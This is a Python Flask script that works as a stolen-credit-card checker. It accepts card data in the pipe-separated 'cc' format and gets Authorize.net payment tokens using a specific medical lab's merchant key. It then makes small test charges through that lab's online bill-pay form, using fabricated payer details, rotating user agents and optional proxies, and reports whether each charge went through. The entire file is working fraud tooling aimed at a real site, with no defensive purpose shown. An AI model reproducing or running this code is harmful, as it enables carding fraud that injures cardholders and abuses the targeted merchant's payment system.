from flask import Flask, request, jsonify
import requests
from fake_useragent import UserAgent, FakeUserAgentError

app = Flask(__name__)

def get_user_agent():
    try:
        ua = UserAgent(use_cache_server=False)
        return ua.random
    except FakeUserAgentError:
        # Fallback user-agent string if fetching fails
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"

def get_opaque_data(card_number, expiration_date, card_code=None):
    url = 'https://api2.authorize.net/xml/v1/request.api'
    headers = {
        'Accept': '*/*',
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://avanticmedicallab.com',
        'Referer': 'https://avanticmedicallab.com/',
        'User-Agent': get_user_agent(),
    }

    data = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": "3c5Q9QdJW",
                "clientKey": "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
            },
            "data": {
                "type": "TOKEN",
                "id": "fake-token-id",  # you can generate or reuse token IDs here if needed
                "token": {
                    "cardNumber": card_number,
                    "expirationDate": expiration_date
                }
            }
        }
    }

    if card_code:
        data["securePaymentContainerRequest"]["data"]["token"]["cardCode"] = card_code

    response = requests.post(url, headers=headers, json=data)
    response.raise_for_status()
    return response.json()

def submit_payment(opaque_descriptor, opaque_value, amount, proxy=None):
    url = 'https://avanticmedicallab.com/wp-admin/admin-ajax.php'

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'multipart/form-data',
        'Origin': 'https://avanticmedicallab.com',
        'Referer': 'https://avanticmedicallab.com/pay-bill-online/',
        'User-Agent': get_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
    }

    # multipart/form-data boundary is handled by requests
    form_data = {
        'wpforms[fields][1][first]': 'John',
        'wpforms[fields][1][last]': 'Doe',
        'wpforms[fields][17]': amount,
        'wpforms[fields][2]': 'email@example.com',
        'wpforms[fields][3]': '(123) 456-7890',
        'wpforms[fields][14]': 'AddressLine',
        'wpforms[fields][4][address1]': 'New York',
        'wpforms[fields][4][city]': 'New York',
        'wpforms[fields][4][state]': 'NY',
        'wpforms[fields][4][postal]': '10001',
        'wpforms[fields][6]': f'$ {amount}',
        'wpforms[fields][11][]': 'By clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.',
        'wpforms[id]': '4449',
        'wpforms[author]': '1',
        'wpforms[post_id]': '3388',
        'wpforms[authorize_net][opaque_data][descriptor]': opaque_descriptor,
        'wpforms[authorize_net][opaque_data][value]': opaque_value,
        'wpforms[authorize_net][card_data][expire]': '',  # expiration date if needed
        'wpforms[token]': 'fake-token',  # you can pass a token or leave as is
        'action': 'wpforms_submit',
        'page_url': 'https://avanticmedicallab.com/pay-bill-online/',
        'page_title': 'Pay Bill Online',
        'page_id': '3388',
    }

    proxies = None
    if proxy:
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}",
        }

    response = requests.post(url, headers=headers, data=form_data, proxies=proxies)
    response.raise_for_status()
    return response.json()

@app.route('/pay', methods=['GET'])
def pay():
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    amount = request.args.get('amount', '0.10')

    if not cc:
        return jsonify({"error": "Missing 'cc' parameter"}), 400

    try:
        # cc format: cardnumber|mm|yy|cvv
        parts = cc.split('|')
        card_number = parts[0]
        month = parts[1]
        year = parts[2]
        card_code = parts[3] if len(parts) > 3 else None
        expiration_date = f"{month}{year}"  # e.g. '0926'

        # Step 1: get opaqueData token from Authorize.net
        opaque_response = get_opaque_data(card_number, expiration_date, card_code)
        opaque_data = opaque_response.get('opaqueData', {})
        opaque_descriptor = opaque_data.get('dataDescriptor')
        opaque_value = opaque_data.get('dataValue')

        if not opaque_descriptor or not opaque_value:
            return jsonify({"error": "Failed to get opaque data"}), 500

        # Step 2: submit payment to site with opaque data
        payment_response = submit_payment(opaque_descriptor, opaque_value, amount, proxy)

        # Step 3: clean and parse the response message
        message = ""
        success = False

        if payment_response.get("success") is True:
            success = True
            message = "$" + amount + " Charged"
        else:
            # try to extract error message from response data
            try:
                errors = payment_response["data"]["errors"]["general"]["footer"]
                import re
                # strip html tags and decode entities
                clean_msg = re.sub(r'<[^>]+>', '', errors)
                message = clean_msg.strip()
            except Exception:
                message = "Payment Declined"

        return jsonify({
            "charged_amount": f"${amount}",
            "message": message,
            "success": success,
            "raw_response": payment_response
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    app.run(debug=True)
